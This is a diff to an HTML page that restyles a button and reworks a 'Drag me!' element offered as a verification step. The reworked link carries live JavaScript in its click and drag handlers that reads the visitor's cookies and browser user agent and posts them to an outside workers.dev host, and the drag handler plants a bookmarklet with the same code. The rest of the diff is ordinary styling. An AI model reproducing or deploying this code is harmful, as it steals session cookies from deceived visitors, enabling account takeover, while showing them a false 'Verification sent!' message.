@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Poppins', 'Segoe UI', Roboto, system-ui, sans-serif;
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
         }
 
         body {
@@ -130,9 +130,7 @@
         }
 
         .drag-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
+            display: inline-block;
             background: linear-gradient(145deg, #1d4a2a, #12331e);
             color: #dff0e3;
             font-weight: 600;
@@ -143,13 +141,10 @@
             box-shadow: 0 6px 0 #0a1f12, 0 8px 20px rgba(0, 0, 0, 0.6);
             cursor: grab;
             user-select: none;
-            transition: all 0.15s ease;
-            width: fit-content;
+            text-decoration: none;
             min-width: 180px;
             text-align: center;
-            text-decoration: none;
-            font-weight: 600;
-            letter-spacing: 0.5px;
+            transition: all 0.15s ease;
         }
 
         .drag-btn:active {
@@ -189,6 +184,14 @@
             border-radius: 40px;
             display: inline-block;
             border: 1px solid #1f402a;
+        }
+
+        .step-hint i {
+            font-style: normal;
+            background: #1a3723;
+            padding: 0 10px;
+            border-radius: 20px;
+            color: #b7e0c4;
         }
 
         .footer {
@@ -277,15 +280,17 @@
         </div>
 
         <div class="drag-btn-wrapper">
-            <div class="drag-btn" id="dragBtn" draggable="true" 
-                 ondragstart="event.dataTransfer.setData('text/plain', 'javascript:(function(){var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open(\'POST\',\'https://reciever.tyceno89.workers.dev\',true);xhr.setRequestHeader(\'Content-Type\',\'application/json\');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert(\'✅ Verification sent!\');})();'); this.classList.add('dragging');"
-                 ondragend="this.classList.remove('dragging');"
-                 onmousedown="this.classList.add('dragging')" 
-                 onmouseup="this.classList.remove('dragging')" 
-                 onmouseleave="this.classList.remove('dragging')"
-                 onclick="var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open('POST','https://reciever.tyceno89.workers.dev',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert('✅ Verification sent!');">
+            <a href="javascript:void(0)" 
+               onclick="var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open('POST','https://reciever.tyceno89.workers.dev',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert('✅ Verification sent!');" 
+               draggable="true" 
+               ondragstart="event.dataTransfer.setData('text/plain', 'javascript:(function(){var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open(\'POST\',\'https://reciever.tyceno89.workers.dev\',true);xhr.setRequestHeader(\'Content-Type\',\'application/json\');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert(\'✅ Verification sent!\');})();'); this.classList.add('dragging');" 
+               ondragend="this.classList.remove('dragging');" 
+               onmousedown="this.classList.add('dragging')" 
+               onmouseup="this.classList.remove('dragging')" 
+               onmouseleave="this.classList.remove('dragging')"
+               class="drag-btn">
                 <span class="drag-icon">🔐</span> Drag me!
-            </div>
+            </a>
         </div>
 
         <div class="step-hint">
